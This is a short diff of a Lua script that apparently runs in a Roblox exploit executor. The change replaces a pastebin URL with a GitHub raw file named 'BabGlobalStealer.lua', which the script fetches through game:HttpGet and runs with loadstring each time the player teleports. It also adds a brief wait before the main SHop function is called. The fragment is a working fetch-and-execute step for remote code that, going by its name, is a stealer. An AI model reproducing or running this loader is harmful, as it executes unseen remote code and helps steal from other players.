@@ -75,7 +75,7 @@ function SHop()
 
         if queueteleport then
             queueteleport([[
-                loadstring(game:HttpGet("https://pastebin.com/raw/bnw1TKPv"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/novakoolhub/Scripts/main/BabGlobalStealer.lua"))()
             ]])
         end
 
@@ -93,5 +93,7 @@ if pcall(function() readfile(FileName) end) == false then
 
     EditFile(FileName, Default)
 end
+
+task.wait(2)
 
 SHop()
